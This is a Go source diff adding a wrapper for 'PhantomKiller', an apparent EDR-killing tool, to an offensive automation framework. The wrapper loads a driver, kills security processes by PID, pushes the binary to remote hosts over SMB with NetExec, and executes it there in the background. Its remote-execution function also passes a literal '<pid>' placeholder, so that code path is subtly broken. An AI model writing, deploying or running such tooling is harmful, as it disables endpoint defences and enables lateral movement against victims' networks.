@@ -1,0 +1,104 @@
+package tools
+
+import (
+	"context"
+	"adpack/utils"
+	"fmt"
+)
+
+type phantomKillerTool struct{}
+
+var PhantomKiller = phantomKillerTool{}
+
+func (phantomKillerTool) Name() string    { return "PhantomKiller" }
+func (phantomKillerTool) Available() bool {
+	return utils.ToolAvailable("PhantomKiller.exe") || utils.ToolAvailable("PhantomKiller")
+}
+
+func (phantomKillerTool) Validate() error {
+	if !PhantomKiller.Available() {
+		return &ToolError{Tool: "PhantomKiller", Op: "validate", Err: fmt.Errorf("PhantomKiller.exe not found")}
+	}
+	return nil
+}
+
+func (phantomKillerTool) Capabilities() []Capability {
+	return []Capability{CapEDRKill}
+}
+
+func (p phantomKillerTool) RunStream(ctx context.Context, req ExecutionRequest) (<-chan ExecutionEvent, error) {
+	ch := make(chan ExecutionEvent, 1)
+	go func() {
+		defer close(ch)
+		result, err := p.Run(ctx, req)
+		if err != nil {
+			ch <- ExecutionEvent{Type: "error", Status: StatusFailed, Error: err}
+			return
+		}
+		ch <- ExecutionEvent{Type: "complete", Status: StatusSuccess, Result: result}
+	}()
+	return ch, nil
+}
+
+type PhantomKillerMode string
+
+const (
+	PhantomKillerModeLoad PhantomKillerMode = "load"
+	PhantomKillerModeKill PhantomKillerMode = "kill"
+)
+
+type PhantomKillerConfig struct {
+	Binary string
+	Driver string
+	PID    int
+	Mode   PhantomKillerMode
+}
+
+func DefaultPhantomKillerConfig() PhantomKillerConfig {
+	return PhantomKillerConfig{
+		Binary: "PhantomKiller.exe",
+		Driver: "BootRepair.sys",
+	}
+}
+
+func (p phantomKillerTool) Run(ctx context.Context, req ExecutionRequest) (*ExecutionResult, error) {
+	cfg := DefaultPhantomKillerConfig()
+	if len(req.Args) > 0 {
+		cfg.Mode = PhantomKillerMode(req.Args[0])
+	}
+	if len(req.Args) > 1 {
+		fmt.Sscanf(req.Args[1], "%d", &cfg.PID)
+	}
+	args := []string{}
+	if cfg.Mode == PhantomKillerModeKill && cfg.PID > 0 {
+		args = append(args, fmt.Sprintf("%d", cfg.PID))
+	}
+	r := utils.RunCommandCtx(ctx, cfg.Binary, args)
+	if !r.Success {
+		return cmdResultToExecResult(r), &ToolError{Tool: "PhantomKiller", Op: "run", ExitCode: r.ExitCode, Err: fmt.Errorf("%s", r.Stderr)}
+	}
+	return cmdResultToExecResult(r), nil
+}
+
+func (p phantomKillerTool) DeployViaSMB(ctx context.Context, target NetExecTarget, localPath, remoteDir string) (*ExecutionResult, error) {
+	if !p.Available() {
+		return nil, &ToolError{Tool: "PhantomKiller", Op: "deploy", Err: fmt.Errorf("PhantomKiller.exe not found locally")}
+	}
+	cr, err := NetExec.PutFile(ctx, target, localPath, remoteDir)
+	if err != nil {
+		return cmdResultToExecResult(cr), &ToolError{Tool: "PhantomKiller", Op: "deploy", Err: err, ExitCode: cr.ExitCode}
+	}
+	return cmdResultToExecResult(cr), nil
+}
+
+func (p phantomKillerTool) ExecRemote(ctx context.Context, target NetExecTarget, remotePath string, mode PhantomKillerMode) (*ExecutionResult, error) {
+	cmd := remotePath
+	if mode == PhantomKillerModeKill {
+		cmd += " <pid>"
+	}
+	cr, err := NetExec.Run(ctx, target, "-x", []string{fmt.Sprintf(`start /B %s`, cmd)})
+	if err != nil {
+		return cmdResultToExecResult(cr), &ToolError{Tool: "PhantomKiller", Op: "exec_remote", Err: err, ExitCode: cr.ExitCode}
+	}
+	return cmdResultToExecResult(cr), nil
+}
